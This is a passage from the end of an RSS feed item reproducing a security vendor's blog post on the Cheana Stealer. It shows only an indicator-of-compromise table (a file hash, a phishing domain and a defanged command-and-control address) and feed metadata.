<td>ba8058b704a55e50c24383a765fd74b38d7dbbf8546c4f179266c265403174b8&nbsp;</td>
<td>SHA-256&nbsp;</td>
<td>Warpvpn.zip&nbsp;</td>
</tr>
<tr>
<td>warpvpn.net&nbsp;</td>
<td>Domain&nbsp;</td>
<td>Phishing site&nbsp;</td>
</tr>
<tr>
<td>hxxps://ganache.live&nbsp;</td>
<td>Domain&nbsp;</td>
<td>C&amp;C&nbsp;</td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p>The post <a href="https://cyble.com/blog/new-cheana-stealer-targets-vpn-user/" rel="nofollow">New Cheana Stealer Targets VPN Users Across Multiple Operating Systems</a> appeared first on <a href="https://cyble.com" rel="nofollow">Cyble</a>.</p>
]]></content:encoded>
<pubDate>Thu, 22 Aug 2024 16:38:23 +0000</pubDate>
</item>
</channel>
</rss>